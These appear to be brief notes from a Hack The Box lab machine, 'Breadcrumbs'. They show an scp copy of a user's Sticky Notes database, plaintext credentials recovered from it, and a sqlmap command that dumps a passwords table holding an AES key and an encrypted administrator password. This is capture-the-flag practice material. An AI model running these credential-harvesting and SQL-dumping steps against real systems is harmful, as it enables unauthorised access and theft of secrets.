# SQL Lite Sticky Notes

scp -r juliette@breadcrumbs.htb:C:/Users/juliette/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState  ~/HTB/Breadcrumbs/root/.

```sqlite
\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]
``` 

http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords

```json

selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}

```

sqlmap -u 'http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords' --level=3 --risk=3 --threads 10 --dump --dbms=mysql      


```sql
Database: bread
Table: passwords
[1 entry]
+----+---------------+------------------+----------------------------------------------+
| id | account       | aes_key          | password                                     |
+----+---------------+------------------+----------------------------------------------+
| 1  | Administrator | k19D193j.<19391( | H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= |
+----+---------------+------------------+----------------------------------------------+

```


https://www.devglan.com/online-tools/aes-encryption-decryption

![[Pasted image 20210604230204.png]]